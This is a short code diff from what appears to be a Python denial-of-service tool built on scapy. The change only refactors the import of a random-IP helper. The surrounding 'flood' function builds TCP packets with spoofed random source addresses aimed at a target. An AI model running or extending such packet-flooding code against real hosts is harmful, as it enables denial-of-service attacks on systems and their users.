@@ -1,7 +1,7 @@
 # Import modules
 import random
 from scapy.all import IP, TCP, send
-import bin.addons.random_data as randomData
+from bin.addons.utils import random_IP
 from stringcolor import *
 
 red = "#ff0033"
@@ -12,7 +12,7 @@ blue = "\033[38;5;51m"
 
 def flood(target):
     IP_Packet = IP()
-    IP_Packet.src = randomData.random_IP()
+    IP_Packet.src = random_IP()
     IP_Packet.dst = target[0]
 
     TCP_Packet = TCP()
